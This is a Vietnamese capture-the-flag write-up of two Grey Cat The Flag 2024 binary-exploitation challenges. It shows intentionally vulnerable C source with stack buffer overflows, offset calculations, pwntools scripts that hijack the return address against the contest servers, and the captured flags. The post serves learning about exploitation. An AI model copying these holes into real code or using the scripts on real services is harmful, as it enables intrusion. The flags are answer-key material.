---
title: Grey Cat The Flag 2024 - Pwnable Writeup
published: 2024-05-10
category: "CTF"
tags: [PWN, CTF]
---

# ****Baby Goods****
- Challenge cho ta 2 file gồm một file thực thi là ```babygoods``` và 1 file code **C** ```babygoods.c```
### Source code
```c 
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char username[0x20];

int menu(char name[0x20]);

int sub_15210123() {
    execve("/bin/sh", 0, 0);
}

int buildpram() {
    char buf[0x10];
    char size[4];
    int num;

    printf("\nChoose the size of the pram (1-5): ");
    fgets(size,4,stdin);
    size[strcspn(size, "\r\n")] = '\0';
    num = atoi(size);
    if (1 > num || 5 < num) {
        printf("\nInvalid size!\n");
        return 0;
    }

    printf("\nYour pram has been created! Give it a name: ");
    //buffer overflow! user can pop shell directly from here
    gets(buf);
    printf("\nNew pram %s of size %s has been created!\n", buf, size);
    return 0;
}

int exitshop() {
    puts("\nThank you for visiting babygoods!\n");
    exit(0);
}

int menu(char name[0x20]) {
    char input[4];
    do {
        printf("\nHello %s!\n", name);
        printf("Welcome to babygoods, where we provide the best custom baby goods!\nWhat would you like to do today?\n");
        printf("1: Build new pram\n");
        printf("2: Exit\n");
        printf("Input: ");
        fgets(input, 4, stdin);
        input[strcspn(input, "\r\n")] = '\0';
        switch (atoi(input))
        {
        case 1:
            buildpram();
            break;
        default:
            printf("\nInvalid input!\n==========\n");
            menu(name);
        }
    } while (atoi(input) != 2);
    exitshop();
}

int main() {
        setbuf(stdin, 0);
        setbuf(stdout, 0);

    printf("Enter your name: ");
    fgets(username,0x20,stdin);
    username[strcspn(username, "\r\n")] = '\0';
    menu(username);
    return 0;
}
```
- Nhìn vào mã nguồn ta thấy lỗi rất rõ ở hàm ```buildpram()``` ở hàm ```gets(buf)``` cho phép nhận đầu vào không giới hạn dẫn đến lỗi ```Buffer Overflow``` cho phép ghi đè vào các bộ đệm lân cận. Xem các biện pháp bảo vệ của chương trình
```shellcode
gef➤  checksec
[+] checksec for '/home/s4ngxg/ctf/grey2024/distribution/babygoods'
Canary                        : ✘
NX                            : ✓
PIE                           : ✘
Fortify                       : ✘
RelRO                         : Partial
```
- ```Canary``` không được bật nên ta có thể khai thác lỗi ```Buffer Overflow```, ta thấy hàm ```sub_15210123()``` gọi shell trên hệ thống. Mục tiêu bây giờ là gì đè địa chỉ của hàm ```sub_15210123()``` vào địa chỉ trả về của hàm ```buildpram()```
- Debug để tìm các địa chỉ trả về của hàm ```buildpram()``` và địa chỉ bắt đầu của hàm ```sub_15210123()```
- Địa chỉ hàm ```sub_15210123()``` là ```0x401236```
- Ta thấy sau khi gọi hàm ```buildpram()``` thì tới lệnh tiếp theo ở địa chỉ ```0x0000000000401404```, đó chính là địa chỉ trả về của hàm ```buildpram()```
- Đặt breakpoint ngay lệnh ```gets()``` và lệnh ```ret``` trong hàm  ```buildpram()``` để tìm địa chỉ trong stack và từ đó tìm được ofset
Địa chỉ của biến ```buf``` trong stack là ```0x00007fffffffdfb0```
Địa chỉ của lệnh trả về trong stack là ```0x00007fffffffdfd8```
- Ofset là ```0x00007fffffffdfd8 - 0x00007fffffffdfb0 = 40 byte```

### Script
```python
from pwn import *

sub_address = 0x401236

p = remote('challs.nusgreyhats.org', 32345)

p.sendlineafter('name: ', b'S4nGxG')
p.sendlineafter('Input: ', b'1')
p.sendlineafter('(1-5): ', b'5')

payload = b'A'*40
payload += p64(sub_address)

p.sendlineafter('name: ', payload)

p.interactive()
```
> ### *grey{4s_34sy_4s_t4k1ng_c4ndy_fr4m_4_b4by}*

# **The Motorala**
### Source code
```c
#include <stdio.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>


char* pin;

// this is the better print, because i'm cool like that ;)
void slow_type(char* msg) {
        int i = 0;
        while (1) {
                if (!msg[i])
                        return;
                putchar(msg[i]);
                usleep(5000);
                i += 1;
        }
}

void view_message() {
        int fd = open("./flag.txt", O_RDONLY);
        char* flag = calloc(0x50, sizeof(char));
        read(fd , flag, 0x50);
        close(fd);
        slow_type("\n\e[1;93mAfter several intense attempts, you successfully breach the phone's defenses.\nUnlocking its secrets, you uncover a massive revelation that holds the power to reshape everything.\nThe once-elusive truth is now in your hands, but little do you know, the plot deepens, and the journey through the clandestine hideout takes an unexpected turn, becoming even more complicated.\n\e[0m");
        printf("\n%s\n", flag);
        exit(0);
}

void retrieve_pin(){
        FILE* f = fopen("./pin", "r");
        pin = malloc(0x40);
        memset(pin, 0, 0x40);
        fread(pin, 0x30, 0x1, f);
        fclose(f);
}

void login() {
        char attempt[0x30];
        int count = 5;

        for (int i = 0; i < 5; i++) {
                memset(attempt, 0, 0x30);
                printf("\e[1;91m%d TRIES LEFT.\n\e[0m", 5-i);
                printf("PIN: ");
                scanf("%s", attempt);
                if (!strcmp(attempt, pin)) {
                        view_message();
                }
        }
        slow_type("\n\e[1;33mAfter five unsuccessful attempts, the phone begins to emit an alarming heat, escalating to a point of no return. In a sudden burst of intensity, it explodes, sealing your fate.\e[0m\n\n");
}

void banner() {

        slow_type("\e[1;33mAs you breached the final door to TACYERG's hideout, anticipation surged.\nYet, the room defied expectations – disorder reigned, furniture overturned, documents scattered, and the vault empty.\n'Yet another dead end,' you muttered under your breath.\nAs you sighed and prepared to leave, a glint caught your eye: a cellphone tucked away under unkempt sheets in a corner.\nRecognizing it as potentially the last piece of evidence you have yet to find, you picked it up with a growing sense of anticipation.\n\n\e[0m");

    puts("                         .--.");
        puts("                         |  | ");
        puts("                         |  | ");
        puts("                         |  | ");
        puts("                         |  | ");
        puts("        _.-----------._  |  | ");
        puts("     .-'      __       `-.  | ");
        puts("   .'       .'  `.        `.| ");
        puts("  ;         :    :          ; ");
        puts("  |         `.__.'          | ");
        puts("  |   ___                   | ");
        puts("  |  (_M_) M O T O R A L A  | ");
        puts("  | .---------------------. | ");
        puts("  | |                     | | ");
        puts("  | |      \e[0;91mYOU HAVE\e[0m       | | ");
        puts("  | |  \e[0;91m1 UNREAD MESSAGE.\e[0m  | | ");
        puts("  | |                     | | ");
        puts("  | |   \e[0;91mUNLOCK TO VIEW.\e[0m   | | ");
        puts("  | |                     | | ");
        puts("  | `---------------------' | ");
        puts("  |                         | ");
        puts("  |                __       | ");
        puts("  |  ________  .-~~__~~-.   | ");
        puts("  | |___C___/ /  .'  `.  \\  | ");
        puts("  |  ______  ;   : OK :   ; | ");
        puts("  | |__A___| |  _`.__.'_  | | ");
        puts("  |  _______ ; \\< |  | >/ ; | ");
        puts("  | [_=]                                          \n");

        slow_type("\e[1;94mLocked behind a PIN, you attempt to find a way to break into the cellphone, despite only having 5 tries.\e[0m\n\n");
}


void init() {
        setbuf(stdin, 0);
        setbuf(stdout, 0);
        retrieve_pin();
        printf("\e[2J\e[H");
}

int main() {
        init();
        banner();
        login();
}
```
- Kiểm tra các trạng thái bảo vệ được bật
- Tiếp theo nhìn vào code ta có thể thấy được lỗi nằm ở hàm ```scanf("%s", attempt);``` khi nhận đầu vào không được giới hạn trong khi mảng ```attempt``` được giới hạn ```0x30 byte``` nên dẫn đến lỗi ```Buffer Overflow``` và ```canary``` không được bật nên ta có thể khai thác lỗi này
- Tương tự challenge ```Baby Goods``` ta cũng tìm địa chỉ stack của ```attempt``` và của địa chỉ trả về hàm ```login()``` để tìm ofset, sau đó overwrite địa của hàm ```view_message()```
- Đặt breakpoint tại sau lệnh gọi hàm ```scanf``` và lệnh ```ret```  trong hàm ```login()``` để tìm địa chỉ của chúng trên stack
Địa chỉ ```attempt``` là ```0x00007fffffffdff0``` 
Địa chỉ trả về trên stack là ```0x00007fffffffe038```
- Sau đó tìm ofset ```0x00007fffffffe038 - 0x00007fffffffdff0 = 72 byte```
- Tương tự như challenge trước ta viết script và khai thác, nhưng không thể vì đã gặp một lỗi. Theo tìm hiểu thì lỗi này vì ngay địa chỉ thực thi của stack không chia hết cho 16 nên ta cần phải pading cho địa chỉ này một địa chỉ khác và sau đó là địa chỉ trả về của hàm ```view_message()```. Ý tưởng ở đây là thêm vào địa chỉ lệnh ```ret``` của hàm bất kì để sau đó có thể nhày đến địa chỉ hàm ```view_message()```
### Script
```python!
from pwn import *

view_message_address =  0x40138e

p = remote('challs.nusgreyhats.org', 30211)
#p = process('./chall')

payload = b'a'*72
payload += p64(0x401564)
payload += p64(view_message_address)

p.sendlineafter('PIN: ',payload)

p.interactive()
```
> ### *grey{g00d_w4rmup_for_p4rt_2_hehe}*